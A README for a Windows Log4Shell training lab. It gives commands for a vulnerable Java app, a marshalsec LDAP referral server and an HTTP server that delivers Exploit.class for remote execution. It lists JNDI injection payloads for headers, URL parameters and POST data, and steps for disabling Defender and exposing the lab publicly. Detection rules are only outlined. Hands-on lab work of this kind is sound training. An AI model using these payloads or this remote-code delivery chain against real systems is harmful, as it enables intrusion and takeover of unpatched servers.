# Log4Shell Security Research Lab

## Overview
Complete Log4Shell (CVE-2021-44228) vulnerability lab environment for Windows with exploitation tools and comprehensive detection rules for YARA, Sigma, and Nuclei.

**Status**: Lab fully operational - Windows native setup (no Docker required)

## Prerequisites

1. **Java 8** - Install from: `C:\Log4Shell-Lab\tools\zulu8.30.0.1-jdk8.0.172-win_x64.msi`
2. **Python 3.x** - For HTTP server
3. **Windows Defender** - Must be disabled or have exclusions for lab folder
4. **curl** - For testing (comes with Windows 10+)

## Quick Start

### 1. Setup Directory Structure
```
C:\Log4Shell-Lab\
├── vulnerable-app\
│   ├── SimpleVulnerable.class
│   ├── log4j-core-2.14.1.jar
│   ├── log4j-api-2.14.1.jar
│   └── marshalsec.jar
└── ldap-server\
    └── Exploit.class
```

### 2. Start the Lab (3 Terminals Required)

**Terminal 1 - Vulnerable Application:**
```powershell
cd C:\Log4Shell-Lab\vulnerable-app

java -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true" "-Dcom.sun.jndi.rmi.object.trustURLCodebase=true" "-Dcom.sun.jndi.cosnaming.object.trustURLCodebase=true" SimpleVulnerable 2>&1 | Tee-Object -FilePath app.log
```

**Terminal 2 - LDAP Server (marshalsec):**
```powershell
cd C:\Log4Shell-Lab\vulnerable-app

java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://localhost:8888/#Exploit" 1389 0.0.0.0
```

**Terminal 3 - HTTP Server (serves Exploit.class):**
```powershell
cd C:\Log4Shell-Lab\ldap-server\

python -m http.server 8888 --bind 0.0.0.0
```

### 3. Run Exploitation

**Local Attack (PowerShell):**
```powershell
# Test JNDI expansion
curl -H "User-Agent: `${java:version}" http://localhost:8080

# Launch exploit
curl -H "User-Agent: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
```

**Browser Attack:**
```
http://localhost:8080/?q=${jndi:ldap://127.0.0.1:1389/Exploit}
```

### 4. Run Detection
```powershell
# YARA scan
yara64.exe detection-rules\log4shell-enhanced.yar C:\Log4Shell-Lab\vulnerable-app\app.log

# Check for JNDI patterns
Select-String -Path C:\Log4Shell-Lab\vulnerable-app\app.log -Pattern '\$\{jndi:'
```

## Lab Components

| Component | Port | Description |
|-----------|------|-------------|
| Vulnerable App | 8080 | Java app with Log4j 2.14.1 |
| LDAP Server | 1389 | marshalsec redirecting to HTTP |
| HTTP Server | 8888 | Serves malicious Exploit.class |

## Exploitation Flow

1. Attacker sends JNDI payload via HTTP header/parameter
2. Vulnerable app logs the input using Log4j
3. Log4j processes `${jndi:ldap://...}` lookup
4. App connects to LDAP server (port 1389)
5. LDAP redirects to HTTP server (port 8888)
6. App downloads and executes Exploit.class

## Attack Vectors

```powershell
# Header injection
curl -H "User-Agent: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
curl -H "X-Forwarded-For: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080

# URL parameter
curl "http://localhost:8080/?search=`${jndi:ldap://127.0.0.1:1389/Exploit}"

# POST data
curl -X POST -d "username=`${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
```

## Remote Access

### Option 1: Tailscale Funnel
```powershell
tailscale funnel 8080
```

### Option 2: Direct IP
Add to hosts: `127.0.0.1 attacker.local`

Attack: `http://YOUR_IP:8080/?q=${jndi:ldap://YOUR_IP:1389/Exploit}`

## Detection Methods

### YARA Rules
- JNDI lookup patterns
- Obfuscation techniques
- Exploitation artifacts

### Sigma Rules
- Web server log patterns
- Process creation anomalies
- Network connections

### Nuclei Templates
- JNDI injection testing
- Header injection points
- WAF bypass techniques

## Firewall Configuration

Run as Administrator:
```powershell
netsh advfirewall firewall add rule name="Log4Shell 8080" dir=in action=allow protocol=TCP localport=8080
netsh advfirewall firewall add rule name="Log4Shell 1389" dir=in action=allow protocol=TCP localport=1389
netsh advfirewall firewall add rule name="Log4Shell 8888" dir=in action=allow protocol=TCP localport=8888
```

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Exploit not working | Ensure Defender is off, all 3 terminals running |
| Port in use | `netstat -ano \| findstr :PORT` then `taskkill /PID <PID> /F` |
| Connection refused | Check firewall rules, verify 0.0.0.0 binding |
| Class not found | Verify Exploit.class exists in ldap-server folder |

## Security Warning

This lab contains actual exploitation code for educational purposes only.

- Run only in isolated environments
- Do not expose to public networks
- Use for security research and training only
- Disable Defender only during lab use

## Technical Details

- **CVE**: CVE-2021-44228 (Log4Shell)
- **Log4j Version**: 2.14.1 (vulnerable)
- **CVSS Score**: 10.0 (Critical)
- **Java Requirement**: JDK 1.8.x (Java 8)

## Repository

https://github.com/hasamba/Log4JLab
